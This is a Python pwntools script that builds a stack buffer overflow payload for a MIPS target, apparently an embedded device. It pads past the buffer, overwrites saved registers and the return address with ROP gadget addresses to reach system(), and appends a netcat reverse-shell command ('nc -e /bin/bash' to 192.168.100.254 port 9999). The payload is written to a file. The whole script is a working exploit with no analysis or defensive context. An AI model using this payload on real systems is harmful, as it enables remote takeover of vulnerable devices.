from pwn import *
context.endian = "little"
context.arch = "mips"
base_addr = 0x77f34000
system_addr_1 = 0x53200-1
gadget1 = 0x158c8
gadget2 = 0x159cc
cmd = 'nc -e /bin/bash 192.168.100.254 9999'
padding = 'A' * 973
padding += p32(base_addr + system_addr_1) # s0
padding += 'A' * 4                        # s1
padding += 'A' * 4                        # s2
padding += 'A' * 4                        # s3
padding += 'A' * 4                        # s4
padding += p32(base_addr+gadget2)         # s5
padding += 'A' * 4                        # s6
padding += 'A' * 4                        # s7
padding += 'A' * 4                        # fp
padding += p32(base_addr + gadget1)       # ra
padding += 'B' * 0x10
padding += cmd
f = open("context",'wb')
f.write(padding)
f.close()
